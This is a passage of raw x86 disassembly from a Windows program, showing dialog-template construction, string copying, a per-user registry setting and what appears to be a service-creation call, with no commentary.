  4016b9:	8b b4 24 24 01 00 00 	mov    0x124(%esp),%esi
  4016c0:	57                   	push   %edi
  4016c1:	74 7b                	je     0x40173e
  4016c3:	83 e8 01             	sub    $0x1,%eax
  4016c6:	74 22                	je     0x4016ea
  4016c8:	83 e8 27             	sub    $0x27,%eax
  4016cb:	75 36                	jne    0x401703
  4016cd:	68 f4 01 00 00       	push   $0x1f4
  4016d2:	56                   	push   %esi
  4016d3:	ff 15 68 e2 41 00    	call   *0x41e268
  4016d9:	3b d8                	cmp    %eax,%ebx
  4016db:	75 26                	jne    0x401703
  4016dd:	6a 05                	push   $0x5
  4016df:	ff 15 64 e2 41 00    	call   *0x41e264
  4016e5:	e9 e0 00 00 00       	jmp    0x4017ca
  4016ea:	0f b7 84 24 30 01 00 	movzwl 0x130(%esp),%eax
  4016f1:	00 
  4016f2:	83 e8 01             	sub    $0x1,%eax
  4016f5:	74 39                	je     0x401730
  4016f7:	83 e8 01             	sub    $0x1,%eax
  4016fa:	74 26                	je     0x401722
  4016fc:	2d f3 01 00 00       	sub    $0x1f3,%eax
  401701:	74 07                	je     0x40170a
  401703:	33 c0                	xor    %eax,%eax
  401705:	e9 c0 00 00 00       	jmp    0x4017ca
  40170a:	68 f4 01 00 00       	push   $0x1f4
  40170f:	56                   	push   %esi
  401710:	ff 15 68 e2 41 00    	call   *0x41e268
  401716:	8b f8                	mov    %eax,%edi
  401718:	e8 73 fc ff ff       	call   0x401390
  40171d:	e9 a3 00 00 00       	jmp    0x4017c5
  401722:	6a 00                	push   $0x0
  401724:	56                   	push   %esi
  401725:	ff 15 60 e2 41 00    	call   *0x41e260
  40172b:	e9 95 00 00 00       	jmp    0x4017c5
  401730:	6a 01                	push   $0x1
  401732:	56                   	push   %esi
  401733:	ff 15 60 e2 41 00    	call   *0x41e260
  401739:	e9 87 00 00 00       	jmp    0x4017c5
  40173e:	55                   	push   %ebp
  40173f:	e8 6c fe ff ff       	call   0x4015b0
  401744:	53                   	push   %ebx
  401745:	8b f8                	mov    %eax,%edi
  401747:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  40174b:	8d 44 24 14          	lea    0x14(%esp),%eax
  40174f:	68 58 06 42 00       	push   $0x420658
  401754:	51                   	push   %ecx
  401755:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  401759:	89 44 24 20          	mov    %eax,0x20(%esp)
  40175d:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  401764:	00 
  401765:	c7 44 24 28 40 16 40 	movl   $0x401640,0x28(%esp)
  40176c:	00 
  40176d:	e8 e3 32 00 00       	call   0x404a55
  401772:	83 c4 0c             	add    $0xc,%esp
  401775:	8d 54 24 20          	lea    0x20(%esp),%edx
  401779:	52                   	push   %edx
  40177a:	56                   	push   %esi
  40177b:	ff 15 58 e2 41 00    	call   *0x41e258
  401781:	8b 1d 68 e2 41 00    	mov    0x41e268,%ebx
  401787:	68 00 00 10 00       	push   $0x100000
  40178c:	6a 00                	push   $0x0
  40178e:	68 35 04 00 00       	push   $0x435
  401793:	68 f4 01 00 00       	push   $0x1f4
  401798:	56                   	push   %esi
  401799:	ff d3                	call   *%ebx
  40179b:	8b 2d 5c e2 41 00    	mov    0x41e25c,%ebp
  4017a1:	50                   	push   %eax
  4017a2:	ff d5                	call   *%ebp
  4017a4:	8d 44 24 14          	lea    0x14(%esp),%eax
  4017a8:	50                   	push   %eax
  4017a9:	6a 02                	push   $0x2
  4017ab:	68 49 04 00 00       	push   $0x449
  4017b0:	68 f4 01 00 00       	push   $0x1f4
  4017b5:	56                   	push   %esi
  4017b6:	ff d3                	call   *%ebx
  4017b8:	50                   	push   %eax
  4017b9:	ff d5                	call   *%ebp
  4017bb:	57                   	push   %edi
  4017bc:	e8 d3 27 00 00       	call   0x403f94
  4017c1:	83 c4 04             	add    $0x4,%esp
  4017c4:	5d                   	pop    %ebp
  4017c5:	b8 01 00 00 00       	mov    $0x1,%eax
  4017ca:	8b 8c 24 20 01 00 00 	mov    0x120(%esp),%ecx
  4017d1:	5f                   	pop    %edi
  4017d2:	5e                   	pop    %esi
  4017d3:	5b                   	pop    %ebx
  4017d4:	33 cc                	xor    %esp,%ecx
  4017d6:	e8 3b 2c 00 00       	call   0x404416
  4017db:	81 c4 18 01 00 00    	add    $0x118,%esp
  4017e1:	c2 10 00             	ret    $0x10
  4017e4:	cc                   	int3
  4017e5:	cc                   	int3
  4017e6:	cc                   	int3
  4017e7:	cc                   	int3
  4017e8:	cc                   	int3
  4017e9:	cc                   	int3
  4017ea:	cc                   	int3
  4017eb:	cc                   	int3
  4017ec:	cc                   	int3
  4017ed:	cc                   	int3
  4017ee:	cc                   	int3
  4017ef:	cc                   	int3
  4017f0:	83 c0 03             	add    $0x3,%eax
  4017f3:	83 e0 fc             	and    $0xfffffffc,%eax
  4017f6:	c3                   	ret
  4017f7:	cc                   	int3
  4017f8:	cc                   	int3
  4017f9:	cc                   	int3
  4017fa:	cc                   	int3
  4017fb:	cc                   	int3
  4017fc:	cc                   	int3
  4017fd:	cc                   	int3
  4017fe:	cc                   	int3
  4017ff:	cc                   	int3
  401800:	8b c1                	mov    %ecx,%eax
  401802:	56                   	push   %esi
  401803:	8d 70 02             	lea    0x2(%eax),%esi
  401806:	66 8b 10             	mov    (%eax),%dx
  401809:	83 c0 02             	add    $0x2,%eax
  40180c:	66 85 d2             	test   %dx,%dx
  40180f:	75 f5                	jne    0x401806
  401811:	2b c6                	sub    %esi,%eax
  401813:	8b 74 24 08          	mov    0x8(%esp),%esi
  401817:	d1 f8                	sar    $1,%eax
  401819:	40                   	inc    %eax
  40181a:	2b f1                	sub    %ecx,%esi
  40181c:	8d 64 24 00          	lea    0x0(%esp),%esp
  401820:	0f b7 11             	movzwl (%ecx),%edx
  401823:	66 89 14 0e          	mov    %dx,(%esi,%ecx,1)
  401827:	83 c1 02             	add    $0x2,%ecx
  40182a:	66 85 d2             	test   %dx,%dx
  40182d:	75 f1                	jne    0x401820
  40182f:	5e                   	pop    %esi
  401830:	c3                   	ret
  401831:	cc                   	int3
  401832:	cc                   	int3
  401833:	cc                   	int3
  401834:	cc                   	int3
  401835:	cc                   	int3
  401836:	cc                   	int3
  401837:	cc                   	int3
  401838:	cc                   	int3
  401839:	cc                   	int3
  40183a:	cc                   	int3
  40183b:	cc                   	int3
  40183c:	cc                   	int3
  40183d:	cc                   	int3
  40183e:	cc                   	int3
  40183f:	cc                   	int3
  401840:	81 ec 10 01 00 00    	sub    $0x110,%esp
  401846:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  40184b:	33 c4                	xor    %esp,%eax
  40184d:	89 84 24 0c 01 00 00 	mov    %eax,0x10c(%esp)
  401854:	55                   	push   %ebp
  401855:	8b ac 24 18 01 00 00 	mov    0x118(%esp),%ebp
  40185c:	55                   	push   %ebp
  40185d:	8d 44 24 10          	lea    0x10(%esp),%eax
  401861:	68 ac 07 42 00       	push   $0x4207ac
  401866:	50                   	push   %eax
  401867:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40186e:	00 
  40186f:	e8 e1 31 00 00       	call   0x404a55
  401874:	83 c4 0c             	add    $0xc,%esp
  401877:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40187b:	51                   	push   %ecx
  40187c:	8d 54 24 10          	lea    0x10(%esp),%edx
  401880:	52                   	push   %edx
  401881:	68 01 00 00 80       	push   $0x80000001
  401886:	ff 15 3c e0 41 00    	call   *0x41e03c
  40188c:	85 c0                	test   %eax,%eax
  40188e:	75 29                	jne    0x4018b9
  401890:	8b 54 24 04          	mov    0x4(%esp),%edx
  401894:	8d 44 24 08          	lea    0x8(%esp),%eax
  401898:	50                   	push   %eax
  401899:	8d 8c 24 20 01 00 00 	lea    0x120(%esp),%ecx
  4018a0:	51                   	push   %ecx
  4018a1:	6a 00                	push   $0x0
  4018a3:	6a 00                	push   $0x0
  4018a5:	68 9c 07 42 00       	push   $0x42079c
  4018aa:	52                   	push   %edx
  4018ab:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%esp)
  4018b2:	00 
  4018b3:	ff 15 40 e0 41 00    	call   *0x41e040
  4018b9:	83 bc 24 1c 01 00 00 	cmpl   $0x0,0x11c(%esp)
  4018c0:	00 
  4018c1:	0f 85 b6 02 00 00    	jne    0x401b7d
  4018c7:	53                   	push   %ebx
  4018c8:	56                   	push   %esi
  4018c9:	57                   	push   %edi
  4018ca:	68 e8 03 00 00       	push   $0x3e8
  4018cf:	6a 40                	push   $0x40
  4018d1:	ff 15 04 e1 41 00    	call   *0x41e104
  4018d7:	8b f0                	mov    %eax,%esi
  4018d9:	68 8c 07 42 00       	push   $0x42078c
  4018de:	8d 7e 12             	lea    0x12(%esi),%edi
  4018e1:	ff 15 08 e1 41 00    	call   *0x41e108
  4018e7:	33 c0                	xor    %eax,%eax
  4018e9:	66 89 46 0a          	mov    %ax,0xa(%esi)
  4018ed:	33 c9                	xor    %ecx,%ecx
  4018ef:	ba 38 01 00 00       	mov    $0x138,%edx
  4018f4:	66 89 56 0e          	mov    %dx,0xe(%esi)
  4018f8:	66 89 4e 0c          	mov    %cx,0xc(%esi)
  4018fc:	b8 b4 00 00 00       	mov    $0xb4,%eax
  401901:	66 89 46 10          	mov    %ax,0x10(%esi)
  401905:	66 89 4e 08          	mov    %cx,0x8(%esi)
  401909:	c7 06 d0 08 c8 80    	movl   $0x80c808d0,(%esi)
  40190f:	33 d2                	xor    %edx,%edx
  401911:	66 89 17             	mov    %dx,(%edi)
  401914:	83 c7 02             	add    $0x2,%edi
  401917:	33 c0                	xor    %eax,%eax
  401919:	66 89 07             	mov    %ax,(%edi)
  40191c:	83 c7 02             	add    $0x2,%edi
  40191f:	57                   	push   %edi
  401920:	b9 68 07 42 00       	mov    $0x420768,%ecx
  401925:	e8 d6 fe ff ff       	call   0x401800
  40192a:	8d 3c 47             	lea    (%edi,%eax,2),%edi
  40192d:	b9 08 00 00 00       	mov    $0x8,%ecx
  401932:	66 89 0f             	mov    %cx,(%edi)
  401935:	83 c7 02             	add    $0x2,%edi
  401938:	57                   	push   %edi
  401939:	b9 4c 07 42 00       	mov    $0x42074c,%ecx
  40193e:	e8 bd fe ff ff       	call   0x401800
  401943:	8d 04 47             	lea    (%edi,%eax,2),%eax
  401946:	e8 a5 fe ff ff       	call   0x4017f0
  40194b:	ba 07 00 00 00       	mov    $0x7,%edx
  401950:	66 89 50 08          	mov    %dx,0x8(%eax)
  401954:	b9 03 00 00 00       	mov    $0x3,%ecx
  401959:	66 89 48 0a          	mov    %cx,0xa(%eax)
  40195d:	ba 2a 01 00 00       	mov    $0x12a,%edx
  401962:	66 89 50 0c          	mov    %dx,0xc(%eax)
  401966:	b9 0e 00 00 00       	mov    $0xe,%ecx
  40196b:	66 89 48 0e          	mov    %cx,0xe(%eax)
  40196f:	ba f6 01 00 00       	mov    $0x1f6,%edx
  401974:	66 89 50 10          	mov    %dx,0x10(%eax)
  401978:	c7 00 00 00 00 50    	movl   $0x50000000,(%eax)
  40197e:	8d 78 12             	lea    0x12(%eax),%edi
  401981:	b8 ff ff 00 00       	mov    $0xffff,%eax
  401986:	66 89 07             	mov    %ax,(%edi)
  401989:	83 c7 02             	add    $0x2,%edi
  40198c:	b9 82 00 00 00       	mov    $0x82,%ecx
  401991:	66 89 0f             	mov    %cx,(%edi)
  401994:	83 c7 02             	add    $0x2,%edi
  401997:	57                   	push   %edi
  401998:	b9 b8 06 42 00       	mov    $0x4206b8,%ecx
  40199d:	e8 5e fe ff ff       	call   0x401800
  4019a2:	8d 04 47             	lea    (%edi,%eax,2),%eax
  4019a5:	33 d2                	xor    %edx,%edx
  4019a7:	66 89 10             	mov    %dx,(%eax)
  4019aa:	bb 01 00 00 00       	mov    $0x1,%ebx
  4019af:	66 01 5e 08          	add    %bx,0x8(%esi)
  4019b3:	83 c0 02             	add    $0x2,%eax
  4019b6:	e8 35 fe ff ff       	call   0x4017f0
  4019bb:	b9 c9 00 00 00       	mov    $0xc9,%ecx
  4019c0:	66 89 48 08          	mov    %cx,0x8(%eax)
  4019c4:	ba 9f 00 00 00       	mov    $0x9f,%edx
  4019c9:	66 89 50 0a          	mov    %dx,0xa(%eax)
  4019cd:	b9 32 00 00 00       	mov    $0x32,%ecx
  4019d2:	ba 0e 00 00 00       	mov    $0xe,%edx
  4019d7:	66 89 48 0c          	mov    %cx,0xc(%eax)
  4019db:	66 89 50 0e          	mov    %dx,0xe(%eax)
  4019df:	8b cb                	mov    %ebx,%ecx
  4019e1:	8d 78 12             	lea    0x12(%eax),%edi
  4019e4:	ba ff ff 00 00       	mov    $0xffff,%edx
  4019e9:	66 89 48 10          	mov    %cx,0x10(%eax)
  4019ed:	c7 00 00 00 01 50    	movl   $0x50010000,(%eax)
  4019f3:	66 89 17             	mov    %dx,(%edi)
  4019f6:	83 c7 02             	add    $0x2,%edi
  4019f9:	b8 80 00 00 00       	mov    $0x80,%eax
  4019fe:	66 89 07             	mov    %ax,(%edi)
  401a01:	83 c7 02             	add    $0x2,%edi
  401a04:	57                   	push   %edi
  401a05:	b9 a8 06 42 00       	mov    $0x4206a8,%ecx
  401a0a:	e8 f1 fd ff ff       	call   0x401800
  401a0f:	8d 04 47             	lea    (%edi,%eax,2),%eax
  401a12:	33 c9                	xor    %ecx,%ecx
  401a14:	66 89 08             	mov    %cx,(%eax)
  401a17:	66 01 5e 08          	add    %bx,0x8(%esi)
  401a1b:	83 c0 02             	add    $0x2,%eax
  401a1e:	e8 cd fd ff ff       	call   0x4017f0
  401a23:	ba ff 00 00 00       	mov    $0xff,%edx
  401a28:	66 89 50 08          	mov    %dx,0x8(%eax)
  401a2c:	b9 9f 00 00 00       	mov    $0x9f,%ecx
  401a31:	66 89 48 0a          	mov    %cx,0xa(%eax)
  401a35:	ba 32 00 00 00       	mov    $0x32,%edx
  401a3a:	66 89 50 0c          	mov    %dx,0xc(%eax)
  401a3e:	ba 02 00 00 00       	mov    $0x2,%edx
  401a43:	b9 0e 00 00 00       	mov    $0xe,%ecx
  401a48:	66 89 48 0e          	mov    %cx,0xe(%eax)
  401a4c:	66 89 50 10          	mov    %dx,0x10(%eax)
  401a50:	c7 00 00 00 01 50    	movl   $0x50010000,(%eax)
  401a56:	8d 78 12             	lea    0x12(%eax),%edi
  401a59:	b8 ff ff 00 00       	mov    $0xffff,%eax
  401a5e:	66 89 07             	mov    %ax,(%edi)
  401a61:	03 fa                	add    %edx,%edi
  401a63:	b9 80 00 00 00       	mov    $0x80,%ecx
  401a68:	66 89 0f             	mov    %cx,(%edi)
  401a6b:	03 fa                	add    %edx,%edi
  401a6d:	57                   	push   %edi
  401a6e:	b9 94 06 42 00       	mov    $0x420694,%ecx
  401a73:	e8 88 fd ff ff       	call   0x401800
  401a78:	8d 04 47             	lea    (%edi,%eax,2),%eax
  401a7b:	33 d2                	xor    %edx,%edx
  401a7d:	66 89 10             	mov    %dx,(%eax)
  401a80:	66 01 5e 08          	add    %bx,0x8(%esi)
  401a84:	83 c0 02             	add    $0x2,%eax
  401a87:	e8 64 fd ff ff       	call   0x4017f0
  401a8c:	b9 07 00 00 00       	mov    $0x7,%ecx
  401a91:	66 89 48 08          	mov    %cx,0x8(%eax)
  401a95:	ba 9f 00 00 00       	mov    $0x9f,%edx
  401a9a:	66 89 50 0a          	mov    %dx,0xa(%eax)
  401a9e:	b9 32 00 00 00       	mov    $0x32,%ecx
  401aa3:	66 89 48 0c          	mov    %cx,0xc(%eax)
  401aa7:	ba 0e 00 00 00       	mov    $0xe,%edx
  401aac:	66 89 50 0e          	mov    %dx,0xe(%eax)
  401ab0:	8d 78 12             	lea    0x12(%eax),%edi
  401ab3:	b9 f5 01 00 00       	mov    $0x1f5,%ecx
  401ab8:	66 89 48 10          	mov    %cx,0x10(%eax)
  401abc:	c7 00 00 00 01 50    	movl   $0x50010000,(%eax)
  401ac2:	ba ff ff 00 00       	mov    $0xffff,%edx
  401ac7:	66 89 17             	mov    %dx,(%edi)
  401aca:	83 c7 02             	add    $0x2,%edi
  401acd:	b8 80 00 00 00       	mov    $0x80,%eax
  401ad2:	66 89 07             	mov    %ax,(%edi)
  401ad5:	83 c7 02             	add    $0x2,%edi
  401ad8:	57                   	push   %edi
  401ad9:	b9 84 06 42 00       	mov    $0x420684,%ecx
  401ade:	e8 1d fd ff ff       	call   0x401800
  401ae3:	8d 04 47             	lea    (%edi,%eax,2),%eax
  401ae6:	33 c9                	xor    %ecx,%ecx
  401ae8:	66 89 08             	mov    %cx,(%eax)
  401aeb:	66 01 5e 08          	add    %bx,0x8(%esi)
  401aef:	83 c0 02             	add    $0x2,%eax
  401af2:	e8 f9 fc ff ff       	call   0x4017f0
  401af7:	ba 07 00 00 00       	mov    $0x7,%edx
  401afc:	66 89 50 08          	mov    %dx,0x8(%eax)
  401b00:	b9 0e 00 00 00       	mov    $0xe,%ecx
  401b05:	66 89 48 0a          	mov    %cx,0xa(%eax)
  401b09:	ba 2a 01 00 00       	mov    $0x12a,%edx
  401b0e:	b9 8c 00 00 00       	mov    $0x8c,%ecx
  401b13:	66 89 50 0c          	mov    %dx,0xc(%eax)
  401b17:	8d 78 12             	lea    0x12(%eax),%edi
  401b1a:	66 89 48 0e          	mov    %cx,0xe(%eax)
  401b1e:	ba f4 01 00 00       	mov    $0x1f4,%edx
  401b23:	57                   	push   %edi
  401b24:	b9 70 06 42 00       	mov    $0x420670,%ecx
  401b29:	66 89 50 10          	mov    %dx,0x10(%eax)
  401b2d:	c7 00 44 18 a1 50    	movl   $0x50a11844,(%eax)
  401b33:	e8 c8 fc ff ff       	call   0x401800
  401b38:	8d 3c 47             	lea    (%edi,%eax,2),%edi
  401b3b:	57                   	push   %edi
  401b3c:	b9 94 06 42 00       	mov    $0x420694,%ecx
  401b41:	e8 ba fc ff ff       	call   0x401800
  401b46:	83 c4 20             	add    $0x20,%esp
  401b49:	55                   	push   %ebp
  401b4a:	33 c9                	xor    %ecx,%ecx
  401b4c:	68 90 16 40 00       	push   $0x401690
  401b51:	51                   	push   %ecx
  401b52:	56                   	push   %esi
  401b53:	66 89 0c 47          	mov    %cx,(%edi,%eax,2)
  401b57:	66 01 5e 08          	add    %bx,0x8(%esi)
  401b5b:	51                   	push   %ecx
  401b5c:	ff 15 6c e2 41 00    	call   *0x41e26c
  401b62:	56                   	push   %esi
  401b63:	89 84 24 2c 01 00 00 	mov    %eax,0x12c(%esp)
  401b6a:	ff 15 10 e1 41 00    	call   *0x41e110
  401b70:	83 bc 24 28 01 00 00 	cmpl   $0x0,0x128(%esp)
  401b77:	00 
  401b78:	5f                   	pop    %edi
  401b79:	5e                   	pop    %esi
  401b7a:	5b                   	pop    %ebx
  401b7b:	74 1e                	je     0x401b9b
  401b7d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401b81:	6a 04                	push   $0x4
  401b83:	8d 94 24 20 01 00 00 	lea    0x120(%esp),%edx
  401b8a:	52                   	push   %edx
  401b8b:	6a 04                	push   $0x4
  401b8d:	6a 00                	push   $0x0
  401b8f:	68 9c 07 42 00       	push   $0x42079c
  401b94:	50                   	push   %eax
  401b95:	ff 15 44 e0 41 00    	call   *0x41e044
  401b9b:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401b9f:	51                   	push   %ecx
  401ba0:	ff 15 48 e0 41 00    	call   *0x41e048
  401ba6:	8b 8c 24 10 01 00 00 	mov    0x110(%esp),%ecx
  401bad:	33 c0                	xor    %eax,%eax
  401baf:	39 84 24 1c 01 00 00 	cmp    %eax,0x11c(%esp)
  401bb6:	5d                   	pop    %ebp
  401bb7:	0f 95 c0             	setne  %al
  401bba:	33 cc                	xor    %esp,%ecx
  401bbc:	e8 55 28 00 00       	call   0x404416
  401bc1:	81 c4 10 01 00 00    	add    $0x110,%esp
  401bc7:	c3                   	ret
  401bc8:	cc                   	int3
  401bc9:	cc                   	int3
  401bca:	cc                   	int3
  401bcb:	cc                   	int3
  401bcc:	cc                   	int3
  401bcd:	cc                   	int3
  401bce:	cc                   	int3
  401bcf:	cc                   	int3
  401bd0:	53                   	push   %ebx
  401bd1:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  401bd5:	55                   	push   %ebp
  401bd6:	56                   	push   %esi
  401bd7:	33 ed                	xor    %ebp,%ebp
  401bd9:	57                   	push   %edi
  401bda:	85 db                	test   %ebx,%ebx
  401bdc:	74 08                	je     0x401be6
  401bde:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  401be2:	85 ff                	test   %edi,%edi
  401be4:	75 2e                	jne    0x401c14
  401be6:	68 04 08 42 00       	push   $0x420804
  401beb:	68 f8 07 42 00       	push   $0x4207f8
  401bf0:	ff 15 08 e1 41 00    	call   *0x41e108
  401bf6:	50                   	push   %eax
  401bf7:	ff 15 28 e1 41 00    	call   *0x41e128
  401bfd:	8b f0                	mov    %eax,%esi
  401bff:	85 f6                	test   %esi,%esi
  401c01:	74 6e                	je     0x401c71
  401c03:	bb a0 60 42 00       	mov    $0x4260a0,%ebx
  401c08:	53                   	push   %ebx
  401c09:	ff 15 00 e1 41 00    	call   *0x41e100
  401c0f:	50                   	push   %eax
  401c10:	ff d6                	call   *%esi
  401c12:	8b f8                	mov    %eax,%edi
  401c14:	33 f6                	xor    %esi,%esi
  401c16:	39 2b                	cmp    %ebp,(%ebx)
  401c18:	7e 57                	jle    0x401c71
  401c1a:	33 ed                	xor    %ebp,%ebp
  401c1c:	8d 64 24 00          	lea    0x0(%esp),%esp
  401c20:	8b 04 b7             	mov    (%edi,%esi,4),%eax
  401c23:	68 e0 07 42 00       	push   $0x4207e0
  401c28:	50                   	push   %eax
  401c29:	e8 ea 30 00 00       	call   0x404d18
  401c2e:	83 c4 08             	add    $0x8,%esp
  401c31:	85 c0                	test   %eax,%eax
  401c33:	74 1c                	je     0x401c51
  401c35:	8b 0c b7             	mov    (%edi,%esi,4),%ecx
  401c38:	68 c8 07 42 00       	push   $0x4207c8
  401c3d:	51                   	push   %ecx
  401c3e:	e8 d5 30 00 00       	call   0x404d18
  401c43:	83 c4 08             	add    $0x8,%esp
  401c46:	85 c0                	test   %eax,%eax
  401c48:	74 07                	je     0x401c51
  401c4a:	46                   	inc    %esi
  401c4b:	3b 33                	cmp    (%ebx),%esi
  401c4d:	7c d1                	jl     0x401c20
  401c4f:	eb 20                	jmp    0x401c71
  401c51:	8b 13                	mov    (%ebx),%edx
  401c53:	4a                   	dec    %edx
  401c54:	3b f2                	cmp    %edx,%esi
  401c56:	bd 01 00 00 00       	mov    $0x1,%ebp
  401c5b:	7d 12                	jge    0x401c6f
  401c5d:	8d 49 00             	lea    0x0(%ecx),%ecx
  401c60:	8b 44 b7 04          	mov    0x4(%edi,%esi,4),%eax
  401c64:	89 04 b7             	mov    %eax,(%edi,%esi,4)
  401c67:	8b 0b                	mov    (%ebx),%ecx
  401c69:	46                   	inc    %esi
  401c6a:	49                   	dec    %ecx
  401c6b:	3b f1                	cmp    %ecx,%esi
  401c6d:	7c f1                	jl     0x401c60
  401c6f:	ff 0b                	decl   (%ebx)
  401c71:	8b 54 24 14          	mov    0x14(%esp),%edx
  401c75:	55                   	push   %ebp
  401c76:	52                   	push   %edx
  401c77:	e8 c4 fb ff ff       	call   0x401840
  401c7c:	83 c4 08             	add    $0x8,%esp
  401c7f:	85 c0                	test   %eax,%eax
  401c81:	74 05                	je     0x401c88
  401c83:	bd 01 00 00 00       	mov    $0x1,%ebp
  401c88:	5f                   	pop    %edi
  401c89:	33 c0                	xor    %eax,%eax
  401c8b:	5e                   	pop    %esi
  401c8c:	85 ed                	test   %ebp,%ebp
  401c8e:	5d                   	pop    %ebp
  401c8f:	0f 95 c0             	setne  %al
  401c92:	5b                   	pop    %ebx
  401c93:	c3                   	ret
  401c94:	cc                   	int3
  401c95:	cc                   	int3
  401c96:	cc                   	int3
  401c97:	cc                   	int3
  401c98:	cc                   	int3
  401c99:	cc                   	int3
  401c9a:	cc                   	int3
  401c9b:	cc                   	int3
  401c9c:	cc                   	int3
  401c9d:	cc                   	int3
  401c9e:	cc                   	int3
  401c9f:	cc                   	int3
  401ca0:	53                   	push   %ebx
  401ca1:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  401ca5:	55                   	push   %ebp
  401ca6:	33 ed                	xor    %ebp,%ebp
  401ca8:	57                   	push   %edi
  401ca9:	85 db                	test   %ebx,%ebx
  401cab:	0f 84 83 00 00 00    	je     0x401d34
  401cb1:	8b 7c 24 18          	mov    0x18(%esp),%edi
  401cb5:	85 ff                	test   %edi,%edi
  401cb7:	74 7b                	je     0x401d34
  401cb9:	56                   	push   %esi
  401cba:	33 f6                	xor    %esi,%esi
  401cbc:	39 33                	cmp    %esi,(%ebx)
  401cbe:	7e 51                	jle    0x401d11
  401cc0:	8b 04 b7             	mov    (%edi,%esi,4),%eax
  401cc3:	68 24 08 42 00       	push   $0x420824
  401cc8:	50                   	push   %eax
  401cc9:	e8 7d 29 00 00       	call   0x40464b
  401cce:	83 c4 08             	add    $0x8,%esp
  401cd1:	85 c0                	test   %eax,%eax
  401cd3:	74 1c                	je     0x401cf1
  401cd5:	8b 04 b7             	mov    (%edi,%esi,4),%eax
  401cd8:	68 18 08 42 00       	push   $0x420818
  401cdd:	50                   	push   %eax
  401cde:	e8 68 29 00 00       	call   0x40464b
  401ce3:	83 c4 08             	add    $0x8,%esp
  401ce6:	85 c0                	test   %eax,%eax
  401ce8:	74 07                	je     0x401cf1
  401cea:	46                   	inc    %esi
  401ceb:	3b 33                	cmp    (%ebx),%esi
  401ced:	7c d1                	jl     0x401cc0
  401cef:	eb 20                	jmp    0x401d11
  401cf1:	8b 03                	mov    (%ebx),%eax
  401cf3:	48                   	dec    %eax
  401cf4:	3b f0                	cmp    %eax,%esi
  401cf6:	bd 01 00 00 00       	mov    $0x1,%ebp
  401cfb:	7d 12                	jge    0x401d0f
  401cfd:	8d 49 00             	lea    0x0(%ecx),%ecx
  401d00:	8b 4c b7 04          	mov    0x4(%edi,%esi,4),%ecx
  401d04:	89 0c b7             	mov    %ecx,(%edi,%esi,4)
  401d07:	8b 13                	mov    (%ebx),%edx
  401d09:	46                   	inc    %esi
  401d0a:	4a                   	dec    %edx
  401d0b:	3b f2                	cmp    %edx,%esi
  401d0d:	7c f1                	jl     0x401d00
  401d0f:	ff 0b                	decl   (%ebx)
  401d11:	8b 44 24 14          	mov    0x14(%esp),%eax
  401d15:	55                   	push   %ebp
  401d16:	50                   	push   %eax
  401d17:	e8 24 fb ff ff       	call   0x401840
  401d1c:	83 c4 08             	add    $0x8,%esp
  401d1f:	5e                   	pop    %esi
  401d20:	85 c0                	test   %eax,%eax
  401d22:	74 05                	je     0x401d29
  401d24:	bd 01 00 00 00       	mov    $0x1,%ebp
  401d29:	33 c0                	xor    %eax,%eax
  401d2b:	5f                   	pop    %edi
  401d2c:	85 ed                	test   %ebp,%ebp
  401d2e:	5d                   	pop    %ebp
  401d2f:	0f 95 c0             	setne  %al
  401d32:	5b                   	pop    %ebx
  401d33:	c3                   	ret
  401d34:	5f                   	pop    %edi
  401d35:	5d                   	pop    %ebp
  401d36:	5b                   	pop    %ebx
  401d37:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  401d3e:	00 
  401d3f:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401d46:	00 
  401d47:	e9 84 fe ff ff       	jmp    0x401bd0
  401d4c:	cc                   	int3
  401d4d:	cc                   	int3
  401d4e:	cc                   	int3
  401d4f:	cc                   	int3
  401d50:	e9 12 31 00 00       	jmp    0x404e67
  401d55:	cc                   	int3
  401d56:	cc                   	int3
  401d57:	cc                   	int3
  401d58:	cc                   	int3
  401d59:	cc                   	int3
  401d5a:	cc                   	int3
  401d5b:	cc                   	int3
  401d5c:	cc                   	int3
  401d5d:	cc                   	int3
  401d5e:	cc                   	int3
  401d5f:	cc                   	int3
  401d60:	e9 d5 31 00 00       	jmp    0x404f3a
  401d65:	cc                   	int3
  401d66:	cc                   	int3
  401d67:	cc                   	int3
  401d68:	cc                   	int3
  401d69:	cc                   	int3
  401d6a:	cc                   	int3
  401d6b:	cc                   	int3
  401d6c:	cc                   	int3
  401d6d:	cc                   	int3
  401d6e:	cc                   	int3
  401d6f:	cc                   	int3
  401d70:	e9 03 33 00 00       	jmp    0x405078
  401d75:	cc                   	int3
  401d76:	cc                   	int3
  401d77:	cc                   	int3
  401d78:	cc                   	int3
  401d79:	cc                   	int3
  401d7a:	cc                   	int3
  401d7b:	cc                   	int3
  401d7c:	cc                   	int3
  401d7d:	cc                   	int3
  401d7e:	cc                   	int3
  401d7f:	cc                   	int3
  401d80:	80 7c 24 14 00       	cmpb   $0x0,0x14(%esp)
  401d85:	b8 10 00 00 00       	mov    $0x10,%eax
  401d8a:	74 05                	je     0x401d91
  401d8c:	b8 10 01 00 00       	mov    $0x110,%eax
  401d91:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401d95:	8b 54 24 08          	mov    0x8(%esp),%edx
  401d99:	6a 00                	push   $0x0
  401d9b:	6a 00                	push   $0x0
  401d9d:	6a 00                	push   $0x0
  401d9f:	6a 00                	push   $0x0
  401da1:	6a 00                	push   $0x0
  401da3:	51                   	push   %ecx
  401da4:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401da8:	6a 00                	push   $0x0
  401daa:	6a 03                	push   $0x3
  401dac:	50                   	push   %eax
  401dad:	8b 44 24 30          	mov    0x30(%esp),%eax
  401db1:	68 ff 01 0f 00       	push   $0xf01ff
  401db6:	52                   	push   %edx
  401db7:	50                   	push   %eax
  401db8:	51                   	push   %ecx
  401db9:	ff 15 34 e0 41 00    	call   *0x41e034
  401dbf:	85 c0                	test   %eax,%eax
